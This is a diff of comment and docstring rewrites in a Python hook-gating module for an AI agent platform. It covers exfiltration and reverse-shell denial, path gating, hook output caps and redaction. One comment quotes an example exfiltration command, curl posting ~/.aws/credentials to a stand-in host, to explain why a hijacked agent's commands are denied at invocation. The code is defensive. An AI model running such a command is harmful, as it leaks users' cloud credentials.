@@ -745,11 +745,11 @@ class HookManager:
             if reason:
                 return ToolHookResult.deny(reason)
             # Data-exfiltration / reverse-shell command shapes.
-            # The anti-exfil patterns previously lived only in the passive audit
-            # path (scan_history / dashboard count) and were never enforced at
-            # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
-            # evil` or open a reverse shell unblocked. Deny them at the gate —
-            # against the raw command too, not just the title.
+            # Enforced at INVOCATION, not only in the passive audit path
+            # (scan_history / dashboard count): auditing alone leaves a hijacked
+            # agent free to `curl -d @~/.aws/credentials evil` or open a reverse
+            # shell. Denied at the gate — against the raw command too, not just
+            # the title.
             reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
@@ -761,10 +761,10 @@ class HookManager:
         # the title hides it. This is the keystone the governance model leans on
         # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
         # EVERY accepted spelling, and a deny on any of them denies: a backend that
-        # sends ``filePath`` (the camel-case form the search plane has always
-        # accepted) reached NEITHER of the two snake_case reads this used to do, so
-        # a write to ~/.ssh under that key was never gated and the human was asked
-        # to approve a path the keystone should have refused outright.
+        # sends ``filePath`` (the camel-case form the search plane accepts) reaches
+        # neither of the two snake_case keys, so reading only those leaves a write
+        # to ~/.ssh under that key ungated and asks the human to approve a path the
+        # keystone should have refused outright.
         if raw_params:
             real_paths = target_paths(raw_params)
             if real_paths.truncated:
@@ -1218,10 +1218,10 @@ class HookManager:
 # "move"; add conservatively (auto-approving trusts an agent-supplied field).
 _READ_ONLY_TOOL_KINDS: frozenset[str] = frozenset({"read", "fetch"})
 
-# Semantic kinds known to mutate/execute. DOCUMENTATION ONLY — the gate no longer
-# branches on this set, and must not start again: `tool_kind` arrives verbatim from
-# the ACP `kind` field, so any denylist of mutating kinds is incomplete by
-# construction (`kind="other"` is a real value that a denylist auto-approved). The
+# Semantic kinds known to mutate/execute. DOCUMENTATION ONLY — the gate does not
+# branch on this set, and must not start: `tool_kind` arrives verbatim from the ACP
+# `kind` field, so any denylist of mutating kinds is incomplete by construction
+# (`kind="other"` is a real value that a denylist auto-approves). The
 # auto-approve decision is an ALLOW-list on `_READ_ONLY_TOOL_KINDS` instead, and
 # every other non-empty kind falls through to interactive approval.
 #
@@ -2028,8 +2028,8 @@ def _unc_agents_root() -> Path | None:
     filesystem I/O, and on a UNC-shaped override an SMB touch), so consulting
     it per gate check would put blocking I/O -- and exactly the network access
     this gate promises not to make -- on every validation, including async
-    callers (review finding on #6728). Memoized on the RAW ``KIRO_HOME`` env
-    value plus the accessor and override-hook identities, so the resolution
+    callers. Memoized on the RAW ``KIRO_HOME`` env value plus the accessor
+    and override-hook identities, so the resolution
     runs once per configuration and a monkeypatched or hot-swapped accessor
     invalidates naturally. Mirrors how ``data_home()`` keeps its own hot path
     cheap.
@@ -2037,8 +2037,8 @@ def _unc_agents_root() -> Path | None:
     A computation failure memoizes ``None`` (root absent, gate stays total):
     deterministic-per-configuration beats self-healing here, because the
     failure mode being avoided is a per-call resolve that can block on an SMB
-    timeout, and the degraded state -- UNC agent specs refused -- is exactly
-    the pre-#6721 status quo. Recovery is an env change or process restart.
+    timeout, and the degraded state -- UNC agent specs refused -- is the safe
+    one. Recovery is an env change or process restart.
     Benign write race under threads: last-writer-wins on an idempotent value.
     """
     global _unc_agents_root_cache
@@ -2065,8 +2065,8 @@ def _unc_agents_root() -> Path | None:
     return root
 
 
-# Prime the memo at import time (review finding, #6728 round 3): without this
-# the FIRST gate check after process start -- or after a ``KIRO_HOME`` change --
+# Prime the memo at import time: without this the FIRST gate check after
+# process start -- or after a ``KIRO_HOME`` change --
 # still pays the resolving accessor on whatever thread asked, which on an async
 # validation path is the event loop. Import of this module happens at process
 # start, off the loop, so the one resolution per configuration lands there.
@@ -2110,7 +2110,7 @@ def unc_probe_allowed(raw: str) -> bool:
     (``apps.bridges._register_agents`` and ``agent.rebuild_agent_config``
     write the managed specs there -- see ``kiro_agents_dir()``'s docstring;
     on a roaming profile it sits on the same UNC share as the data home, and
-    without it every user-level agent spec read was silently refused, #6721).
+    without it every user-level agent spec read is silently refused).
     The comparison is purely lexical (``normpath``/``normcase``) and the
     agents root is memoized per configuration (see ``_unc_agents_root``), so
     this check never touches the network itself.
@@ -2687,11 +2687,11 @@ def _pinned_replace(
     # protects the user's data: the file is either the old bytes or all of the new
     # ones, never a shredded half-write.
     #
-    # This used to fail closed without the pinned variant. That made the whole
-    # mirror-back feature Linux-only in order to defend against someone renaming
-    # directories inside your project during the milliseconds of a save, on your
-    # own machine, to a file you explicitly asked us to link. Losing the feature
-    # on two platforms was the larger harm.
+    # Failing closed without the pinned variant would make the whole mirror-back
+    # feature Linux-only in order to defend against someone renaming directories
+    # inside your project during the milliseconds of a save, on your own machine,
+    # to a file you explicitly asked us to link. Losing the feature on two
+    # platforms is the larger harm.
     #
     # Use getattr for O_DIRECTORY: a bare os.O_DIRECTORY raises AttributeError,
     # which `except OSError` would NOT catch, surfacing as a 500.
@@ -3645,7 +3645,7 @@ class ScriptHook:
       PreToolUse BLOCKS the tool (fail closed; the block detail prefers
       ``ScriptHookResult.error``, then stderr, then "exited with code N").
       Every other event stays warn-only (stderr shown to user). There is no
-      per-hook advisory/fail-open opt-out yet (#7547).
+      per-hook advisory/fail-open opt-out.
     """
 
     id: str = ""
@@ -3715,13 +3715,13 @@ class ScriptHook:
 
 # ── Script hook output caps ──
 #
-# ``run_script_hook`` used to ``await proc.communicate(...)``, which buffers
-# BOTH pipes in memory until EOF: a buggy or hostile hook could emit unbounded
-# stdout/stderr and OOM (or stall) the gateway for every session before the
-# 500-char presentation limit was ever applied (#5442). We now drain each
-# stream incrementally and keep only the first ``_HOOK_STREAM_CAP_BYTES`` bytes,
-# while continuing to read (and discard) the rest so the child can never block
-# on a full pipe. The cap is generously above the 500-char field we surface, so
+# ``await proc.communicate(...)`` buffers BOTH pipes in memory until EOF, so a
+# buggy or hostile hook can emit unbounded stdout/stderr and OOM (or stall) the
+# gateway for every session before the 500-char presentation limit is ever
+# applied. ``run_script_hook`` instead drains each stream incrementally and keeps
+# only the first ``_HOOK_STREAM_CAP_BYTES`` bytes, while continuing to read (and
+# discard) the rest so the child can never block on a full pipe. The cap is
+# generously above the 500-char field we surface, so
 # the retained prefix is always enough to decode and truncate for display, yet
 # small enough that a runaway hook cannot exhaust memory.
 _HOOK_STREAM_CAP_BYTES = 64 * 1024
@@ -4030,14 +4030,13 @@ async def run_script_hook(
                     pass
         elapsed = int((time.monotonic() - start) * 1000)
         exit_code = proc.returncode or 0
-        # Decode with the upstream byte cap (#5442) so redaction never sees an
-        # unbounded string, THEN redact the full capped streams through the
-        # canonical companion-aware shim before any truncation or return
-        # (#5441). Both fields are returned by the test API, and stdout can also
-        # become model context for prompt/spawn hooks; redacting the capped text
-        # first prevents a credential that straddles a presentation boundary
-        # (e.g. the 500-char stderr cut for last_error, #4708) from leaking as
-        # an unredacted fragment.
+        # Decode with the upstream byte cap so redaction never sees an unbounded
+        # string, THEN redact the full capped streams through the canonical
+        # companion-aware shim before any truncation or return. Both fields are
+        # returned by the test API, and stdout can also become model context for
+        # prompt/spawn hooks; redacting the capped text first prevents a credential
+        # that straddles a presentation boundary (e.g. the 500-char stderr cut for
+        # last_error) from leaking as an unredacted fragment.
         stdout_text = _decode_capped(stdout_b, stdout_trunc).strip()
         stderr_text = _decode_capped(stderr_b, stderr_trunc).strip()
         stdout_safe = redact_via_context(stdout_text) if stdout_text else ""
@@ -4075,7 +4074,7 @@ async def run_script_hook(
                 await platform_compat.kill_process_tree_async(proc.pid, platform_compat.SIGKILL)
                 # Reap the killed tree WITHOUT re-buffering: a hook that timed
                 # out having already flooded its pipes must not be able to OOM
-                # us during cleanup (#5442). Drain both pipes concurrently under
+                # us during cleanup. Drain both pipes concurrently under
                 # the same cap and discard; sequential reads can deadlock when
                 # residual data fills the other pipe.
                 await asyncio.gather(
@@ -4131,13 +4130,12 @@ class ScriptHookStore:
         # belong to the user. Preserve their raw JSON values across later status
         # and CRUD writes so fail-soft loading does not become silent data loss.
         self._unparsed_hook_entries: list[object] = []
-        # Mutations used to be implicitly serialised by running on the single
-        # event-loop thread. They are now offloaded with asyncio.to_thread (the
-        # persistence takes a file lock and fsyncs, which must not block the
-        # loop), so two of them can genuinely interleave: A mutates, B mutates,
-        # B persists, then A persists a snapshot taken BEFORE B's change and
-        # drops it. Re-entrant because the persist path is called from inside
-        # the same held section.
+        # Mutations are offloaded with asyncio.to_thread (the persistence takes a
+        # file lock and fsyncs, which must not block the loop) rather than being
+        # implicitly serialised on the single event-loop thread, so two of them can
+        # genuinely interleave: A mutates, B mutates, B persists, then A persists a
+        # snapshot taken BEFORE B's change and drops it. Re-entrant because the
+        # persist path is called from inside the same held section.
         self._mutex = threading.RLock()
         self._load()
 
@@ -4197,13 +4195,13 @@ class ScriptHookStore:
         ``hooks.json`` is shared: this store owns the ``hooks`` key, but the
         ``register_hook`` MCP tool stores webhook resume contexts as top-level
         keys (one per hook id) in the same file. Writing ``{"hooks": [...]}``
-        wholesale used to erase all of them, so any script-hook create / update /
-        toggle / delete silently dropped every pending webhook context. Merge
+        wholesale erases all of them, so any script-hook create / update /
+        toggle / delete would silently drop every pending webhook context. Merge
         instead of replace.
 
         An unreadable file ABORTS the write rather than proceeding with "no
-        foreign keys". Continuing was the earlier choice, on the reasoning that
-        the script hooks were still recoverable — but the foreign keys are not:
+        foreign keys". Continuing would leave the script hooks recoverable — but
+        the foreign keys are not:
         a corrupt read means their contents are unknown, and writing the merged
         result would replace the file with only what this store happens to hold,
         permanently erasing every registered webhook context. Refusing leaves
@@ -4277,10 +4275,10 @@ class ScriptHookStore:
         if not hook.id:
             hook.id = str(uuid.uuid4())[:8]
         # Enforce the SAME invariants `update` does, via the shared validator:
-        # a direct/internal caller of `create` used to bypass the command+skills
-        # invariant, event membership, and timeout bounds (only `update` checked
-        # them), so it could persist a hook the update path would reject and that
-        # later silently fails to fire. `from_dict` clamps the timeout on the way
+        # checking them only in `update` lets a direct/internal caller of `create`
+        # bypass the command+skills invariant, event membership and timeout bounds,
+        # persisting a hook the update path would reject and that later silently
+        # fails to fire. `from_dict` clamps the timeout on the way
         # in, but validate against the ORIGINAL `data` so a caller that passed an
         # out-of-range timeout is told rather than having it silently clamped —
         # matching the API schema's reject-don't-clamp behavior. Raises
